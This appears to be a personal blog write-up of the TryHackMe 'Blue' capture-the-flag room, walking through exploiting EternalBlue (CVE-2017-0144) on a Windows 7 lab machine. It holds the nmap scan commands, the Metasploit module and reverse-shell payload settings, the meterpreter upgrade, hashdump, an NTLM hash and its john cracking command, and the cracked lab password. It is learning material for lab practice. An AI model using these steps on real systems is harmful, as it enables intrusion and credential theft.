---
title: TryHackMe - Easy CTF - Blue
date: '2024-04-22'
tags: ['ctf', 'tryhackme', 'boot2root', 'writeup' , 'windows-exploitation', 'john']
draft: false
summary: Deploy & hack into a Windows machine, leveraging common misconfigurations issues.

---

## Solution:

I know it is an old room, but the purpose of writing this write-up is to document my whole journey of learning system exploitation. In this blog, we will learn about **[CVE-2017-0144](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2017-0144)**

So, let's get started.

As we have been asked to identify the number of open ports below 1000, I will only scan the first 1000 ports:

```bash:nmap-command
sudo nmap -sS -Pn -A -p 1-1000 $IP -oN nmap.log
```

#### Now you may ask why we need `sudo` to do such a scan?

In Nmap, the **`-sS`** option is used to perform a TCP SYN scan. The reason why sudo privileges are often needed to run Nmap with the **`-sS`** option is because SYN scanning involves crafting and sending raw network packets, which requires low-level access to network interfaces. By default, regular users don't have permission to send raw packets, as it can potentially be misused. Therefore, using sudo allows Nmap to run with the necessary privileges to perform the scan effectively.

Scan reveals that we have 3 ports running under 1000:

![Screenshot](/static/writeups/tryhackme/blue/Untitled.png)

We know that `smb` (by default) runs on port `139` or `445`. Plus we can see that its a Windows 7 box running on service pack 1. Going down we can see smb version:

![Screenshot](/static/writeups/tryhackme/blue/Untitled1.png)

A small handy tip, usually if we come across rooms running windows OS under windows 10, it usually indicates that smb (that they are running) is vulnerable.

Based on the gathered information, it is evident that this is indeed an EternalBlue exploit room.

But lets assume, I don’t know if the machine is vulnerable or not. I can use this command to find out:

```bash:nmap-command
sudo nmap -sS -Pn -p 445 --script smb-vuln-* $IP
```

This command will tell me to which smb CVE it is vulnerable to. 

![Screenshot](/static/writeups/tryhackme/blue/Untitled2.png)

![Screenshot](/static/writeups/tryhackme/blue/Untitled4.png)

Let’s move toward exploitation phase. Start metasploit:

![Screenshot](/static/writeups/tryhackme/blue/Untitled5.png)

Search for **`eternalblue`** exploit:

![Screenshot](/static/writeups/tryhackme/blue/Untitled6.png)

We will use **`exploit/windows/smb/ms17_010_eternalblue`** get a remote code execution

![Screenshot](/static/writeups/tryhackme/blue/Untitled7.png)

Now search for options and set the one required value (which is RHOSTS) to machine’s IP address:

![Screenshot](/static/writeups/tryhackme/blue/Untitled8.png)

![Screenshot](/static/writeups/tryhackme/blue/Untitled9.png)

Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:

**`set payload windows/x64/shell/reverse_tcp`**

![Screenshot](/static/writeups/tryhackme/blue/Untitled10.png)

With that done, run the exploit!

![Screenshot](/static/writeups/tryhackme/blue/Untitled11.png)

We got the access:

![Screenshot](/static/writeups/tryhackme/blue/Untitled12.png)

Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (**CTRL + Z**). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target. 

If the issue persists, try switching the port number using the `set LPORT` option.

Moving on, now we will convert a shell to meterpreter shell. For that search `shell_to_meterpreter` in msfconsole:

![Screenshot](/static/writeups/tryhackme/blue/Untitled13.png)

We will use this script `post/multi/manage/shell_to_meterpreter`

Now search for options and set the one required value (which is SESSION) to session ID which in our case is 1 and run it:

![Screenshot](/static/writeups/tryhackme/blue/Untitled14.png)

Congrats, we have successfully upgraded our shell to a meterpreter shell:

![Screenshot](/static/writeups/tryhackme/blue/Untitled15.png)

To enter into the shell type:

```
msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 2
```

Now to verify that we have indeed escalated to `NT AUTHORITY\SYSTEM`, run `shell` command followed by `whoami` command:

![Screenshot](/static/writeups/tryhackme/blue/Untitled16.png)

Running `ps` command (because it is mentioned in the room to do so):

![Screenshot](/static/writeups/tryhackme/blue/Untitled17.png)

Now to migrate to a process simply type migrate and the process ID:

```
meterpreter > migrate 2480
```

In my case, it is not migrating to any process maybe because we are already nt authority\system:

![Screenshot](/static/writeups/tryhackme/blue/Untitled18.png)

Anyways let’s continue. 

Within our elevated meterpreter shell, run the command `hashdump`. This will dump all of the passwords on the machine as long as we have the correct privileges to do so:

![Screenshot](/static/writeups/tryhackme/blue/Untitled19.png)

The name of the none default user is `jon` as administrator and guest account is created by default.

Its time to crack password the password for `jon`. Save the hash of john into a file:

```bash:terminal
echo "Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::" > hash.txt
```

To crack it, I will use `john` but you can use hashcat too:

```bash:john-command
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![Screenshot](/static/writeups/tryhackme/blue/Untitled20.png)

Password is `alqfna22`

Now, its time to find flags.

### Flag 1:

![Screenshot](/static/writeups/tryhackme/blue/Untitled21.png)

![Screenshot](/static/writeups/tryhackme/blue/Untitled22.png)

### Flag 2:

![Screenshot](/static/writeups/tryhackme/blue/Untitled23.png)

![Screenshot](/static/writeups/tryhackme/blue/Untitled24.png)

### Flag 3:

![Screenshot](/static/writeups/tryhackme/blue/Untitled25.png)

![Screenshot](/static/writeups/tryhackme/blue/Untitled26.png)